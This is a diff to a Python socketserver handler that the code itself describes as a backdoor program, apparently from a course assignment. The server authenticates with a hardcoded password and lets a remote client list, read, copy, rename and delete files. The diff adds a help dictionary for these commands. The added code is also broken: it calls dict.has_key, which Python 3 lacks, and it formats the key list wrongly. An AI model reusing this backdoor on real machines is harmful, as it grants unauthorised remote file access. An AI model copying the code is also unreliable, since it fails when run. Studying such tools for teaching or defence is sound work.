@@ -33,6 +33,22 @@ def listContents():
 class MyTCPHandler(socketserver.BaseRequestHandler):                            # Create a request handler as subclass of BaseRequestHandler
    BUFFER_SIZE = 4096                                                           # Input buffer for client requests will be 4096 bytes
    PASSWORD_SIZE = 1024
+   COMMAND_LIST = {
+   'pwd': 'pwd  - shows current working directory',
+   'cd': 'cd <dir> - change current working directory to <dir>',
+   'ls': 'list contents of the current working directory',
+   'cp': 'cp <file1> <file2> - copy file1 to file2',
+   'mv': 'mv <file1> <file2> - rename file1 to file2',
+   'rm': 'rm <file> - delete file',
+   'cat': 'cat <file> - return contents of the file',
+   'snap': 'snap - takes a snapshot of all the files in the current directory',
+   'diff': 'diff - compares the content of the current directory to the saved snapshot',
+   'help': 'help - list command options\nhelp <cmd> - show detailed help for given cmd',
+   'logout': 'logout - disconnect client',
+   'off': 'off - terminate the backdoor program',
+   'opt1': 'PLACEHOLDER',
+   'opt2': 'PLACEHOLDER',
+   }
    def handle(self):                                                            # Override parent class handle method to handle incoming requests
        # Authenticate user via hardcoded password
        self.request.sendall( bytearray( "Enter Password: ", "utf-8"))
@@ -57,8 +73,11 @@ class MyTCPHandler(socketserver.BaseRequestHandler):                            
                data = (data.decode( "utf-8")).strip()                                     # Decode received byte array to interpret command
                wordsInCommand = data.split()
                # Process client command
-               if (data.lower() == "help"): #TODO add two more commands of our choosing to this list and implement
-                   self.request.sendall( bytearray( "Supported commands:\n pwd, cd, cp, ls, mv, rm, cat, snap, diff, help, logout, off \n", "utf-8"))
+               if (wordsInCommand[0].lower() == "help"): #TODO add two more commands of our choosing to this list and implement
+                   if (len(wordsInCommand) == 1) or not(self.COMMAND_LIST.has_key(wordsInCommand[1].lower())):
+                       self.request.sendall( bytearray( "Supported commands:\n" + str(self.COMMAND_LIST.keys()).strip('[]').replace('\'','') + "\n", "utf-8"))
+                   else:
+                       self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[1].lower()] + "\n", "utf-8"))
                elif data.lower() == "pwd" :
                    result = printWorkingDir()
                    self.request.sendall(bytearray(result, "utf-8"))
